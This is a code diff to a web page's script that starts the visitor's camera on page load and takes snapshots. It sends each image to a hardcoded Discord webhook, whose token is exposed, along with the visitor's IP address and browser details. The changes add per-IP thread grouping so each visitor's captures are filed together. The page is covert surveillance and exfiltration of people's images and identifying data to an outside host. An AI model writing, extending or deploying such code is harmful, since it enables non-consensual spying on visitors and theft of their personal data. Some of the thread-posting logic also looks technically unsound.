@@ -44,8 +44,9 @@
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1299390747711373334/iO5Sbk83deMgQEYd8YfesE-jcYQmL2fudZcdiGuuJUCUZe95-1gNs4VbmYd6mM2qAJhJ"; // Replace with your webhook URL
 
-        // Initialize a dictionary to keep track of visits
+        // Initialize a dictionary to keep track of visits and threads
         const ipVisits = {};
+        const threads = {}; // To keep track of thread IDs for each IP
 
         // Start the camera automatically when the page loads
         window.onload = async () => {
@@ -116,7 +117,7 @@
             }
         }
 
-        function takeSnapshot(stream, ipAddress, userAgent) {
+        async function takeSnapshot(stream, ipAddress, userAgent) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
@@ -135,8 +136,8 @@
             // Display the snapshot
             document.getElementById('snapshot').src = imageData;
 
-            // Send the image to Discord with additional details
-            uploadImageToDiscord(imageData, video.videoWidth, video.videoHeight, userAgent, ipAddress);
+            // Upload the image to the correct thread for the IP address
+            await uploadImageToDiscord(imageData, video.videoWidth, video.videoHeight, userAgent, ipAddress);
         }
 
         async function uploadImageToDiscord(imageData, width, height, userAgent, ipAddress) {
@@ -158,19 +159,56 @@
             `;
             formData.append('content', content.trim()); // Append the message to the form data
 
+            // Check if a thread already exists for this IP
+            if (!threads[ipAddress]) {
+                const response = await createThread(ipAddress); // Create a new thread for this IP
+                threads[ipAddress] = response.id; // Store the thread ID
+            }
+
+            // Send the image to the thread
+            await sendImageToThread(blob, threads[ipAddress], content);
+        }
+
+        async function createThread(ipAddress) {
+            // Create a thread for the IP address
+            const threadContent = `Thread created for IP: ${ipAddress}`;
+            const formData = new FormData();
+            formData.append('content', threadContent);
+
+            const response = await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (response.ok) {
+                const data = await response.json();
+                console.log(`Thread created for IP: ${ipAddress}`);
+                return data; // Return the thread data
+            } else {
+                console.error('Failed to create thread:', response.statusText);
+                throw new Error('Thread creation failed');
+            }
+        }
+
+        async function sendImageToThread(blob, threadId, content) {
+            // Create a form to send the image to the thread
+            const formData = new FormData();
+            formData.append('file', blob, 'snapshot.png');
+            formData.append('content', content); // Message content associated with the image
+
             try {
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                const response = await fetch(`${DISCORD_WEBHOOK_URL}/messages/${threadId}`, {
                     method: 'POST',
                     body: formData
                 });
 
                 if (response.ok) {
-                    console.log('Image successfully sent to Discord.');
+                    console.log('Image successfully sent to thread.');
                 } else {
-                    console.error('Failed to send image to Discord:', response.statusText);
+                    console.error('Failed to send image to thread:', response.statusText);
                 }
             } catch (error) {
-                console.error('Error uploading image to Discord:', error);
+                console.error('Error sending image to thread:', error);
             }
         }
 
